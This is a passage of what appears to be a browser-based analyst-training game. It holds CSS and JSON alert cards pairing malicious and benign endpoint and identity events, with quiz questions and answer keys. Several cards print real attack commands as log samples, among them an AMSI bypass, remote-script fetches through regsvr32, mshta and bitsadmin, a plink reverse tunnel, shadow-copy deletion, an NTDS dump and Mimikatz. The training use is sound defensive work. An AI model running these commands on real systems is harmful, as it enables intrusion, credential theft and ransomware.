:root{--bg:#06080c;--p1:#0e131b;--p2:#151c27;--ln:#222c3b;--tx:#eaf0f8;--dim:#8a96aa;
--red:#ff4d5e;--grn:#3ee68a;--cy:#22d3ee;--yl:#fbbf24;--pu:#a78bfa;--pk:#f472b6;--or:#fb923c;
--r0:#94a3b8;--r1:#38bdf8;--r2:#c084fc;--r3:#fbbf24;
--top:env(safe-area-inset-top,0px);--bot:env(safe-area-inset-bottom,0px);
--sans:"Space Grotesk",system-ui,-apple-system,"Segoe UI",sans-serif;--mono:"JetBrains Mono",ui-monospace,Consolas,monospace;--px:"Press Start 2P",ui-monospace,monospace}
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--sans);overflow:hidden;overscroll-behavior:none}
button{font:inherit;color:inherit;background:none;border:0;cursor:pointer}
a{color:inherit}
.px{font-family:var(--px);letter-spacing:.02em}
.mono{font-family:var(--mono)}
#app{height:100%;overflow-y:auto;overflow-x:hidden;padding:calc(var(--top) + 14px) 16px calc(var(--bot) + 110px);max-width:560px;margin:0 auto}
.scr{animation:in .22s ease}
@keyframes in{from{opacity:0;transform:translateY(8px)}}
.hdr{display:flex;align-items:center;gap:8px}
.logo{font-size:16px;color:var(--grn);text-shadow:0 0 14px #3ee68a55}
.logo b{color:var(--red)}
.chip{font-size:12px;background:var(--p1);border:1px solid var(--ln);padding:5px 9px;border-radius:99px;white-space:nowrap}
.rank{margin-top:14px;background:var(--p1);border:1px solid var(--ln);border-radius:18px;padding:14px 16px}
.rank .t{font-size:12px;color:var(--dim)}
.rank .n{font-size:22px;font-weight:700;margin:3px 0 10px}
.xpb{height:8px;background:var(--p2);border-radius:9px;overflow:hidden}
.xpb i{display:block;height:100%;background:linear-gradient(90deg,var(--grn),var(--cy));border-radius:9px;transition:width .6s}
.big{display:block;width:100%;margin-top:12px;padding:18px 20px;border-radius:20px;background:var(--grn);color:#03140a;text-align:left;position:relative;overflow:hidden}
.big .px{font-size:15px}
.big small{display:block;margin-top:8px;font-size:13px;font-weight:500;opacity:.85}
.big::after{content:"▶";position:absolute;right:20px;top:50%;transform:translateY(-50%);font-size:24px}
.big.alt{background:var(--p1);color:var(--tx);border:1px solid var(--ln)}
.big.alt::after{color:var(--yl)}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:10px}
.tile{background:var(--p1);border:1px solid var(--ln);border-radius:18px;padding:14px;text-align:left;min-height:100px;display:flex;flex-direction:column;justify-content:space-between;text-decoration:none;position:relative}
.tile .k{font-size:11px;letter-spacing:.12em;text-transform:uppercase;color:var(--c,var(--dim));font-weight:700}
.tile .v{font-size:17px;font-weight:700;margin-top:6px;line-height:1.2}
.tile small{font-size:12px;color:var(--dim);margin-top:6px}
.tile.lock{opacity:.45}
.sec{font-size:12px;letter-spacing:.14em;text-transform:uppercase;color:var(--dim);margin:22px 0 8px;font-weight:700}
.inc{display:flex;gap:12px;align-items:center;background:var(--p1);border:1px solid var(--ln);border-radius:16px;padding:12px 14px;margin-bottom:8px;width:100%;text-align:left}
.inc .ic{width:42px;height:42px;border-radius:12px;display:grid;place-items:center;font-size:20px;background:var(--p2);flex:none}
.inc b{display:block;font-size:15px}
.inc span{font-size:12px;color:var(--dim)}
.inc .done{margin-left:auto;color:var(--grn);font-size:11px;font-weight:700}
.tiny{font-size:12px;color:var(--dim);text-align:center;margin-top:16px;line-height:1.6}
.ring{display:flex;align-items:center;gap:12px;margin-top:12px;background:var(--p1);border:1px solid var(--ln);border-radius:16px;padding:10px 14px}
.ring svg{flex:none}
.ring b{font-size:15px}.ring span{font-size:12px;color:var(--dim);display:block}
/* runner */
.bar{display:flex;align-items:center;gap:10px;margin-bottom:12px}
.x{width:38px;height:38px;border-radius:12px;background:var(--p1);border:1px solid var(--ln);font-size:18px;flex:none}
.prog{flex:1;height:8px;background:var(--p2);border-radius:9px;overflow:hidden}
.prog i{display:block;height:100%;background:var(--cy);transition:width .3s}
.combo{font-size:12px;font-weight:700;color:var(--yl);min-width:64px;text-align:right;transition:transform .2s}
.combo.pop{transform:scale(1.35)}
.hearts{font-size:15px;letter-spacing:1px;white-space:nowrap}
.chain{display:flex;gap:4px;margin:-4px 0 10px;flex-wrap:wrap}
.chain span{font-size:10px;font-family:var(--mono);padding:3px 6px;border-radius:6px;background:var(--p2);border:1px solid var(--ln);color:var(--dim)}
.chain span.on{background:#2b0b12;border-color:var(--red);color:var(--red)}

.xpf{position:fixed;font-family:var(--px);font-size:15px;color:var(--grn);pointer-events:none;z-index:50;animation:xpf 1s forwards;text-shadow:0 0 12px #3ee68a}
.xpf.neg{color:var(--red);text-shadow:none}

.shake{animation:shake .35s}

JABlAHIAcgBvAHIAQQBjAHQAaQBvAG4A...","decoded: $errorActionPreference='Stop'; Get-Counter '\\Processor(_Total)\\% Processor Time'"],"v":0,"x":"T1059.001","c":"encoded-ps-decode","k":[2],"diff":2,"trap":"scary","say":"The monitoring agent launched PowerShell with an encoded command that decodes to a request for processor performance counters.","tell":"Encoded does not mean evil. HealthService.exe is the SCOM/Azure Monitor agent and the decoded body just reads perf counters. Always decode before you escalate.","pair":"e05"},{"id":"e07","d":"endpoint","src":"Windows Security \u00b7 4698","t":"Scheduled task created","h":"WS-FIN-0356 \u00b7 SYSTEM","l":["task: \\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan","action: %systemroot%\\system32\\usoclient.exe StartScan","author: Microsoft Corporation"],"v":0,"x":"T1053.005","c":"scheduled-task-fake-name","k":[1],"diff":2,"trap":"scary","say":"A scheduled task under the update orchestrator path runs the update client from system thirty-two, authored by Microsoft.","tell":"UpdateOrchestrator + usoclient.exe from system32 is Windows Update doing Windows Update things. Location and path match the real thing.","pair":"e04"},{"id":"e08","d":"endpoint","src":"Sysmon \u00b7 Event ID 10","t":"LSASS handle opened","h":"WS-IT-0033 \u00b7 admin_kp","l":["source: C:\\Users\\admin_kp\\Downloads\\pd64.exe","target: C:\\Windows\\System32\\lsass.exe","granted access: 0x1fffff","signer: Sysinternals (Microsoft)"],"v":1,"x":"T1003.001","c":"lsass-access","k":[0],"diff":2,"say":"A tool in the downloads folder opened the local security authority process with full access; its signer is Microsoft Sysinternals.","tell":"Signed by Microsoft does not mean safe. That is ProcDump renamed to pd64.exe in Downloads, with full access (0x1fffff) on LSASS. Signed tools, unsigned intentions.","pair":"e09"},{"id":"e09","d":"endpoint","src":"Sysmon \u00b7 Event ID 10","t":"LSASS handle opened","h":"WS-MKT-0588 \u00b7 SYSTEM","l":["source: C:\\Program Files\\Windows Defender Advanced Threat Protection\\MsSense.exe","target: C:\\Windows\\System32\\lsass.exe","granted access: 0x1000"],"v":0,"x":"T1003.001","c":"lsass-access","k":[0],"diff":2,"trap":"scary","say":"The endpoint sensor opened the local security authority process from its own install folder with a limited query access right.","q":{"kind":"tune","ask":"Best tuning?","o":["Stop all LSASS-access alerts","Allowlist the EDR image path for LSASS access","Allowlist by access mask only"],"a":1,"why":"Trust the signed sensor image, not a mask attackers can copy."},"tell":"Your own EDR touches LSASS all day. The tell is the signed sensor image from its own install path, not the access mask: attackers copy innocent-looking masks too.","pair":"e08"},{"id":"e10","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"vssadmin and wbadmin execution","h":"SRV-APP-22 \u00b7 SYSTEM","l":["parent: cmd.exe (parent: svch0st.exe)","cmd: vssadmin.exe delete shadows /all /quiet","followed by: wbadmin delete catalog -quiet"],"v":1,"x":"T1490","c":"shadow-copy-deletion","k":[1],"diff":1,"say":"A command deleted all shadow copies quietly and then deleted the backup catalog, parented through a misspelled service host.","q":{"kind":"contain","ask":"First action?","o":["Isolate the host now","Restore from backup","Open a ticket for morning"],"a":0,"why":"Backups are being destroyed; isolate before encryption."},"tell":"Deleting all shadow copies AND the backup catalog = ransomware clearing the escape hatches. Also: svch0st with a zero. Escalate yesterday."},{"id":"e11","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"Defender exclusion added","h":"WS-DEV-0260 \u00b7 jvasquez","l":["parent: powershell.exe (parent: winword.exe)","cmd: Add-MpPreference -ExclusionPath C:\\Users\\Public\\","user is not a local admin... until 2 min ago"],"v":1,"x":"T1685","c":"disable-security-control","k":[2],"diff":3,"say":"A Word-spawned PowerShell added a Defender exclusion for a public folder, and the user became a local admin two minutes earlier.","tell":"Excluding C:\\Users\\Public from Defender, from a Word-spawned PowerShell, right after a privilege change. Someone is clearing a spot to drop a payload.","pair":"e12"},{"id":"e12","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"Defender exclusion added","h":"SRV-BUILD-09 \u00b7 svc_build01","l":["parent: java.exe (Jenkins build agent)","cmd: Add-MpPreference -ExclusionPath D:\\jenkins\\workspace\\","change ticket: CHG0041872 (approved)"],"v":0,"x":"T1685","c":"disable-security-control","k":[2],"diff":2,"trap":"scary","say":"A build agent added a Defender exclusion for its workspace folder, with an approved change ticket referenced.","q":{"kind":"tune","ask":"Best tuning?","o":["Allow all Defender exclusions from service accounts","Scope the exclusion to the build account and workspace path","Disable exclusion alerts"],"a":1,"why":"Tie it to the account and path in the change, nothing broader."},"tell":"Build servers exclude their workspace so Defender stops eating compile speed. Service account, build-agent parent, approved change ticket. Annoying, not evil.","pair":"e11"},{"id":"e13","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceRegistryEvents","t":"Run key persistence","h":"WS-OPS-0055 \u00b7 mfarah","l":["key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","value: Spotify","data: \"C:\\Users\\gharris\\AppData\\Roaming\\Spotify\\Spotify.exe\" /minimized","signer: Spotify AB"],"v":0,"x":"T1547.001","c":"run-key-persistence","k":[3],"diff":2,"trap":"scary","say":"A run key named Spotify points to the Spotify app in roaming app data, starting minimized, signed by Spotify.","tell":"Run keys are where every app with an ego lives. Spotify, signed, in its own folder, with /minimized. That is a music addiction, not an intrusion.","pair":"e14"},{"id":"e14","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceRegistryEvents","t":"Run key persistence","h":"WS-LEG-0019 \u00b7 rpatel","l":["key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","value: WindowsSecurityHealth","data: \"C:\\Users\\rpatel\\AppData\\Local\\Temp\\wsh.vbs\"","signer: none (script)"],"v":1,"x":"T1547.001","c":"run-key-persistence","k":[2],"diff":2,"say":"A run key named Windows Security Health points to a script in the temp folder, with no signer.","tell":"The real SecurityHealth entry lives in HKLM and points to System32. A VBS out of Temp wearing a Windows costume is persistence cosplay.","pair":"e13"},{"id":"e15","d":"endpoint","src":"Sysmon \u00b7 Event ID 1","t":"Discovery burst","h":"WS-FIN-0477 \u00b7 hlarsen","l":["within 40 seconds:","whoami /all \u2192 net group \"Domain Admins\" /domain \u2192 nltest /domain_trusts \u2192 net view /all"],"v":1,"x":"T1087.002","c":"discovery-burst","k":[1],"diff":2,"say":"In forty seconds the host ran who-am-i, domain admins group, domain trusts, and net view, back to back.","tell":"One discovery command is an admin. Four in 40 seconds, ending with domain trusts, is someone reading the map before they move.","pair":"e16"},{"id":"e16","d":"endpoint","src":"Sysmon \u00b7 Event ID 1","t":"Discovery burst","h":"WS-IT-0045 \u00b7 jvasquez","l":["parent: mmc.exe \u2192 cmd.exe","cmd: ipconfig /all \u2192 ping dc01 \u2192 nslookup dc01 \u2192 gpupdate /force","ticket: INC0098341 \"user cannot get GPO\""],"v":0,"x":"T1016","c":"discovery-burst","k":[2],"diff":2,"trap":"scary","say":"Through the management console a session ran ip config, ping, name lookup, and group policy update, with a matching help desk ticket.","tell":"Network troubleshooting looks like recon to a robot. ipconfig, ping, nslookup, gpupdate, with a matching helpdesk ticket = Ana is fixing a printer.","pair":"e15"},{"id":"e17","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"Remote service creation","h":"SRV-DC-04 \u00b7 CORP\\swhite","l":["source host: WS-ACCT-0421","service: BTOBTO","binary: %COMSPEC% /Q /c echo cd ^> \\\\127.0.0.1\\C$\\__output 2^>^&1 > %TEMP%\\execute.bat"],"v":1,"x":"T1569.002","c":"impacket-remote-exec","k":[2],"diff":3,"say":"A workstation remotely created a service on a domain controller whose binary echoes output to a local admin share path.","tell":"That output-to-\\\\127.0.0.1\\C$\\__output pattern is Impacket smbexec. An accounting workstation creating services on a DC is lateral movement in a trench coat.","pair":"e28"},{"id":"e18","d":"endpoint","src":"Windows System \u00b7 7045","t":"New service installed","h":"WS-PM-0301 \u00b7 SYSTEM","l":["service: Zoom Sharing Service","path: \"C:\\Program Files\\Common Files\\Zoom\\Support\\CptService.exe\"","signer: Zoom Video Communications, Inc."],"v":0,"x":"T1543.003","c":"new-service-signer","k":[2],"diff":1,"trap":"scary","say":"A new service named Zoom Sharing Service runs a Zoom binary from common files, signed by Zoom.","tell":"Signed vendor binary in Program Files with a boring name. New services happen every Patch Tuesday. Path + signer is the 5-second check."},{"id":"e19","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"Mshta remote script","h":"WS-REC-0030 \u00b7 bokoro","l":["parent: explorer.exe","cmd: mshta.exe http://invoice-docs[.]online/v.hta"],"v":1,"x":"T1218.005","c":"lolbin-remote-script","k":[1],"diff":1,"say":"Explorer launched the HTML application host to pull an application from an invoice-themed internet domain.","tell":"mshta pulling an .hta from a random domain = someone clicked. Nobody legit runs HTAs from the internet in 2026."},{"id":"e20","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"regsvr32 execution","h":"WS-ENG-0144 \u00b7 bwalsh","l":["cmd: regsvr32.exe /s /n /u /i:http://203.0.113.50/x.sct scrobj.dll"],"v":1,"x":"T1218.010","c":"lolbin-remote-script","k":[0],"diff":2,"say":"Regsvr32 ran silently with an install switch pointing to a remote scriptlet over the web using the script object library.","tell":"regsvr32 + /i:http + scrobj.dll is \"Squiblydoo\". It runs remote scriptlets through a signed binary. Textbook since 2016 and it still works."},{"id":"e21","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceFileEvents","t":"Mass file rename","h":"SRV-FS-03 \u00b7 CORP\\svc_backup","l":["1,842 files renamed in 90 sec","extension: .docx \u2192 .docx.6h1k9","new file in each folder: readme_restore.txt"],"v":1,"x":"T1486","c":"mass-file-rename","k":[1],"diff":1,"say":"Nearly two thousand files were renamed in ninety seconds, each getting a new extension, with a restore note left in every folder.","q":{"kind":"contain","ask":"First action?","o":["Isolate the file server immediately","Start restoring files","Email the owner"],"a":0,"why":"Encryption is live; isolation stops the spread."},"tell":"New random extension on every file + a readme in every folder = encryption in progress. Isolate first, ask questions while it is isolated.","pair":"e22"},{"id":"e22","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceFileEvents","t":"Mass file rename","h":"WS-DES-0019 \u00b7 cdiaz","l":["3,100 files renamed in 2 min","process: Adobe Lightroom Classic.exe","pattern: IMG_####.CR3 \u2192 2026-11-02_Shoot_####.CR3"],"v":0,"x":"T1486","c":"mass-file-rename","k":[1],"diff":1,"trap":"scary","say":"Three thousand files were renamed in two minutes by Lightroom, from image numbers into a dated shoot naming pattern.","q":{"kind":"tune","ask":"Best tuning?","o":["Stop all mass-rename alerts","Exclude the whole design team","Exclude Lightroom bulk renames with a date pattern"],"a":2,"why":"Scope to the app and its rename pattern."},"tell":"Bulk rename by Lightroom with a date pattern is a photographer batch-renaming a shoot. Ransomware does not care about your naming conventions.","pair":"e21"},{"id":"e23","d":"endpoint","src":"Sysmon \u00b7 Event ID 1","t":"Remote Desktop tunneling","h":"WS-ENG-0341 \u00b7 tmalley","l":["cmd: C:\\ProgramData\\svc\\plink.exe -ssh -R 0.0.0.0:4455:127.0.0.1:3389 root@198.51.100.7 -pw ********"],"v":1,"x":"T1572","c":"covert-tunnel-egress","k":[0],"diff":2,"say":"A link utility opened a reverse-forwarded tunnel from the local remote desktop port out to an external address over SSH.","tell":"plink reverse-forwarding local RDP to an outside box. Somebody wants a GUI on this host from the internet."},{"id":"e24","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"Remote access tool executed","h":"WS-FIN-0222 \u00b7 kdavis","l":["process: AnyDesk.exe from C:\\Users\\kdavis\\Downloads","first seen in org: today","preceded by: 14 min phone call with \"Microsoft Support\""],"v":1,"x":"T1219","c":"rmm-sanctioned-vs-rogue","k":[1,2],"diff":3,"say":"An unknown remote access tool ran from downloads, first seen today, right after a fourteen minute call from Microsoft Support.","q":{"kind":"contain","ask":"First action?","o":["Isolate the host and kill the RMM session","Ask the user to hang up","Block the AnyDesk domain only"],"a":0,"why":"A live attacker has remote control; cut it now."},"tell":"Unsanctioned RMM + first seen today + a phone call from \"Microsoft\" = tech support scam or a callback-phishing crew. RMM tools are the new malware.","pair":"e25"},{"id":"e25","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"Remote access tool executed","h":"WS-IT-0211 \u00b7 rkhan","l":["process: ScreenConnect.ClientService.exe","path: C:\\Program Files (x86)\\ScreenConnect Client (a1b2c3)\\","instance ID matches: corp IT tenant","deployed by: Intune"],"v":0,"x":"T1219","c":"rmm-sanctioned-vs-rogue","k":[2],"diff":2,"trap":"scary","say":"A screen sharing client ran from program files, its instance identifier matching the corporate IT tenant, deployed by Intune.","q":{"kind":"tune","ask":"Best tuning?","o":["Allowlist all ScreenConnect binaries","Allowlist the sanctioned ScreenConnect instance ID","Allowlist the host"],"a":1,"why":"Trust your own tenant instance, not every ScreenConnect."},"tell":"Same tool category, different story. Deployed by Intune, instance ID matches your own IT tenant. Know your sanctioned RMMs and their instance IDs.","pair":"e24"},{"id":"e26","d":"endpoint","src":"Windows Security \u00b7 1102","t":"Security log cleared","h":"SRV-DC-03 \u00b7 CORP\\rblum (accounting)","l":["event: The audit log was cleared","subject: CORP\\jmiller (accounting)","time: 03:17 local"],"v":1,"x":"T1685.005","c":"log-clearing","k":[1,2],"diff":2,"say":"The domain controller security audit log was cleared at three seventeen in the morning by an account from the accounting team.","tell":"An accountant clearing the DC security log at 3am. There is no world where that is fine."},{"id":"e27","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"Ntdsutil execution","h":"SRV-DC-05 \u00b7 CORP\\da_mwilson","l":["cmd: ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\\x\" q q","time: 02:41","da_mwilson last interactive logon: 9 months ago"],"v":1,"x":"T1003.003","c":"ntdsutil-ifm-dump","k":[0],"diff":2,"say":"An install-from-media command dumped the directory database at two forty-one, using a domain admin dormant for nine months.","q":{"kind":"pivot","ask":"First pivot?","o":["Reset every user password","Reboot the DC","Check the IFM output path and the dormant admin activity"],"a":2,"why":"Confirm the dump and scope the dormant admin."},"tell":"IFM creation dumps NTDS.dit, the whole domain's hashes. Using a dormant Domain Admin at 2am. That is the crown jewels walking out."},{"id":"e28","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"WMI remote process creation","h":"SRV-WEB-04 \u00b7 CORP\\svc_mgmt","l":["parent: WmiPrvSE.exe","cmd: C:\\Windows\\CCM\\ccmsetup.exe /mp:sccm01.corp.local SMSSITECODE=CRP","source: sccm01.corp.local"],"v":0,"x":"T1047","c":"impacket-remote-exec","k":[1],"diff":2,"trap":"scary","say":"A WMI process spawned the configuration manager setup pointing at the corporate site server with the corporate site code.","tell":"WmiPrvSE spawning ccmsetup with your own site code from your own SCCM server is client push. WMI lateral is only scary when the parent story does not make sense.","pair":"e29"},{"id":"e29","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"WMI remote process creation","h":"SRV-HR-02 \u00b7 CORP\\kfisher","l":["parent: WmiPrvSE.exe","cmd: cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1730962811.42 2>&1","source: WS-SALES-0744"],"v":1,"x":"T1047","c":"impacket-remote-exec","k":[1],"diff":2,"say":"A WMI process ran a command whose output goes to a local admin share with a timestamp name, sourced from a workstation.","tell":"cmd /Q /c ... 1> \\\\127.0.0.1\\ADMIN$\\__<timestamp> is Impacket wmiexec\u2019s fingerprint. A workstation driving commands on a server it has no business on. Lateral movement.","pair":"e28"},{"id":"e30","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceImageLoadEvents","t":"Unsigned DLL sideload","h":"WS-ENG-0201 \u00b7 ykim","l":["process: C:\\Users\\Public\\Music\\OneDriveStandaloneUpdater.exe (signed Microsoft)","loaded: version.dll (unsigned) from same folder"],"v":1,"x":"T1574.001","c":"dll-sideload-signer","k":[1],"diff":2,"say":"A signed Microsoft updater copied into a public music folder loaded an unsigned version dll sitting beside it.","tell":"Signed Microsoft EXE copied to Public\\Music, loading an unsigned version.dll next to it = DLL sideloading. The legit binary is the getaway car.","pair":"z12"},{"id":"e31","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceEvents","t":"PowerShell script block content","h":"WS-SALES-0870 \u00b7 ewong","l":["script content: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"],"v":1,"x":"T1685","c":"disable-security-control","k":[0],"diff":2,"say":"A script reflectively set the anti-malware scan interface initialization-failed flag to true for the session.","tell":"Flipping amsiInitFailed to true blinds AMSI for the session. Zero legit software does this. It is the attacker turning off the lights before the main event.","pair":"e12"},{"id":"e32","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"Browser credential access","h":"WS-MKT-0233 \u00b7 mjain","l":["process: C:\\Users\\asingh\\AppData\\Local\\Temp\\7zS1A2.tmp\\setup.exe","read: ...\\Google\\Chrome\\User Data\\Default\\Login Data","read: ...\\Microsoft\\Edge\\User Data\\Default\\Cookies","outbound: 91.92.x.x:443 (12 MB)"],"v":1,"x":"T1555.003","c":"browser-cred-theft","k":[0,3],"diff":2,"say":"A setup file in temp read the Chrome login data and Edge cookies, then sent twelve megabytes to an external address.","q":{"kind":"contain","ask":"First action?","o":["Revoke the user sessions and cookies, then reset","Reset the password only","Clear the browser cache"],"a":0,"why":"Stolen cookies bypass MFA; kill sessions, not just passwords."},"tell":"Random setup.exe reading browser Login Data AND Cookies, then 12 MB out. That is an infostealer, and those cookies mean MFA is already bypassed. Revoke sessions, not just passwords.","pair":"e33"},{"id":"e33","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"Browser credential access","h":"WS-IT-0073 \u00b7 lhecht","l":["process: C:\\Program Files\\1Password\\app\\8\\1Password.exe","read: ...\\Google\\Chrome\\User Data\\Default\\Login Data","user action: \"Import from Chrome\" clicked"],"v":0,"x":"T1555.003","c":"browser-cred-theft","k":[2],"diff":2,"trap":"scary","say":"The signed password manager read Chrome's saved login data right after the user clicked import from Chrome.","q":{"kind":"tune","ask":"Best tuning?","o":["Stop all browser-credential alerts","Allowlist the user","Allowlist the signed password manager during a user-driven import"],"a":2,"why":"Trust the signed app and user action, not the behavior blindly."},"tell":"Password managers import from browsers, which looks identical to a stealer at the file level. Signed vendor app + a user-driven import = fine.","pair":"e32"},{"id":"e34","d":"endpoint","src":"Sysmon \u00b7 Event ID 1","t":"Kerberoasting tool pattern","h":"WS-DEV-0401 \u00b7 afox","l":["cmd: C:\\Users\\mchen\\Desktop\\Rubeus.exe kerberoast /outfile:h.txt","followed by: 47 TGS requests (RC4) in 6 sec"],"v":1,"x":"T1558.003","c":"kerberoast-source","k":[0],"diff":2,"say":"Rubeus ran a kerberoast command to an output file, followed by forty-seven service ticket requests in six seconds.","tell":"Rubeus kerberoast, then a burst of RC4 service tickets. They are grabbing service account hashes to crack offline. Find the weak SPN passwords before they do.","pair":"e35"},{"id":"e35","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"Kerberoasting tool pattern","h":"WS-SEC-0012 \u00b7 dneal","l":["cmd: Rubeus.exe kerberoast /outfile:h.txt","account: dneal (temp account, engagement ENG-2611 red team)","window: inside approved RoE, 09:00-17:00"],"v":0,"x":"T1558.003","c":"kerberoast-source","k":[1],"diff":2,"trap":"scary","say":"Rubeus ran a kerberoast command under a temporary account tied to an engagement, inside the approved rules and hours.","tell":"Same exact behavior as a real kerberoast, but it is your pentester, inside scope and hours. Context is the whole job. Still: confirm with the engagement lead.","pair":"e34"},{"id":"e36","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"Suspicious child of web server","h":"SRV-WEB-05 \u00b7 IIS APPPOOL\\Portal","l":["parent: w3wp.exe","cmd: cmd.exe /c whoami & ipconfig & net user"],"v":1,"x":"T1505.003","c":"webshell-activity","k":[1],"diff":1,"say":"The IIS worker process spawned a command running who-am-i, ip config, and net user.","tell":"IIS worker spawning cmd with whoami is a webshell saying hello. Web servers serve pages; they do not ask who they are.","pair":"e37"},{"id":"e37","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"Suspicious child of web server","h":"SRV-WEB-02 \u00b7 IIS APPPOOL\\Reports","l":["parent: w3wp.exe","cmd: \"C:\\Program Files\\wkhtmltopdf\\bin\\wkhtmltopdf.exe\" --quiet https://reports.corp.local/r/4471 C:\\Temp\\r4471.pdf"],"v":0,"x":"T1505.003","c":"webshell-activity","k":[1],"diff":2,"trap":"scary","say":"The IIS worker process launched a PDF generator from its known install path to render an internal report URL to a file.","tell":"Some web apps legitimately shell out, like report-to-PDF generators. Known install path, internal URL, consistent pattern. Baseline your w3wp children.","pair":"e36"},{"id":"e38","d":"endpoint","src":"Windows PowerShell \u00b7 4104","t":"PowerShell 4104: script block logged","h":"SRV-APP-09 \u00b7 CORP\\svc_sql","l":["script block: Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"'","loaded from: memory (no file)"],"v":1,"x":"T1003.001","c":"mimikatz-present","k":[0],"diff":2,"say":"Script block logging captured an invoke-Mimikatz logon-passwords command loaded from memory under a service account.","tell":"Script block logging caught it even though it never hit disk. Invoke-Mimikatz on a server under a service account = someone already owns svc_sql."},{"id":"e39","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"Bitsadmin download","h":"WS-ENG-0233 \u00b7 gpowell","l":["cmd: bitsadmin /transfer job /download /priority high http://193.x.x.x/p.ps1 C:\\Users\\Public\\p.ps1"],"v":1,"x":"T1197","c":"bits-download","k":[0],"diff":1,"trap":"bland","say":"Bits-admin started a high priority transfer downloading a PowerShell script from a raw address into a public folder.","tell":"BITS jobs survive reboots and blend with Windows Update traffic. Downloading a .ps1 from a raw IP into Public is not an update."},{"id":"e40","d":"endpoint","src":"Defender for Endpoint \u00b7 AlertEvidence","t":"Password spray from host","h":"WS-REC-0051 \u00b7 cwells","l":["4625 failures against 212 different accounts in 10 min","password pattern: same for all (Autumn2026!)","source process: powershell.exe"],"v":1,"x":"T1110.003","c":"password-spray-brute","k":[1],"diff":1,"say":"In ten minutes one host failed sign-ins against two hundred accounts using the same password, launched from PowerShell.","q":{"kind":"contain","ask":"First action?","o":["Isolate the host launching the spray","Reset the two hundred accounts","Block the office subnet"],"a":0,"why":"The source is compromised and attacking; isolate it."},"tell":"Many accounts, one password, short window = password spray. From the front desk PC via PowerShell means it is already compromised and being used as a launchpad."},{"id":"i01","d":"identity","src":"Entra ID \u00b7 SigninLogs","t":"Impossible travel","h":"kwong@corp.com","l":["09:02 Dallas, US \u00b7 ASN: AT&T","09:31 Frankfurt, DE \u00b7 ASN: Zscaler","MFA: satisfied both \u00b7 same device ID"],"v":0,"x":"T1078.004","c":"impossible-travel","k":[2],"diff":2,"trap":"scary","say":"Sign-ins from Dallas and Frankfurt half an hour apart, both through a corporate proxy, same device, MFA satisfied both times.","tell":"Impossible travel loves VPNs. Zscaler egress + same device ID + passed MFA = one person behind a proxy. Check the ASN before you panic.","pair":"i02"},{"id":"i02","d":"identity","src":"Entra ID \u00b7 SigninLogs","t":"Impossible travel","h":"rgarcia@corp.com","l":["08:15 Houston, US \u00b7 device: compliant laptop","08:52 Lagos, NG \u00b7 ASN: residential ISP","MFA: satisfied via token (no prompt) \u00b7 device: unregistered \u00b7 UA: python-requests"],"v":1,"x":"T1550.004","c":"impossible-travel","k":[2],"diff":2,"say":"A sign-in from Lagos with a token and no prompt, from an unregistered device, using a python-requests user agent.","q":{"kind":"contain","ask":"First action?","o":["Revoke sessions and tokens, then reset","Reset the password only","Require a new MFA method"],"a":0,"why":"A replayed cookie survives a password reset."},"tell":"No MFA prompt, unregistered device, python-requests user agent. That is a stolen session cookie being replayed. Revoke sessions, do not just reset the password.","pair":"i01"},{"id":"i03","d":"identity","src":"Entra ID \u00b7 SigninLogs","t":"MFA fatigue","h":"rhad@corp.com","l":["22 MFA push denials in 9 minutes","push #23: approved at 23:48","source IP: 185.220.x.x (Tor exit)"],"v":1,"x":"T1621","c":"mfa-fatigue","k":[2],"diff":2,"say":"Twenty-two push denials in nine minutes, then one approval near midnight, from a Tor exit address.","q":{"kind":"contain","ask":"First action?","o":["Just reset the password","Revoke sessions and enforce number matching","Call the user"],"a":1,"why":"Cut the approved session and stop the bombing."},"tell":"22 denials then one approve at midnight = the user got annoyed and gave up. Classic MFA bombing. Number matching kills this.","pair":"i04"},{"id":"i04","d":"identity","src":"Entra ID \u00b7 SigninLogs","t":"Multiple MFA failures","h":"bwalsh@corp.com","l":["5 MFA failures (timeout) in 20 min","IP: corp office \u00b7 device: compliant","user ticket: \"got a new phone, Authenticator broken\""],"v":0,"x":"T1621","c":"mfa-fatigue","k":[2],"diff":2,"trap":"scary","say":"Five MFA timeouts over twenty minutes from the office on a compliant device, with a new-phone ticket open.","tell":"Timeouts from the office on a compliant device + a \"new phone\" ticket = a human fighting their own Authenticator. Fatigue attacks come from outside 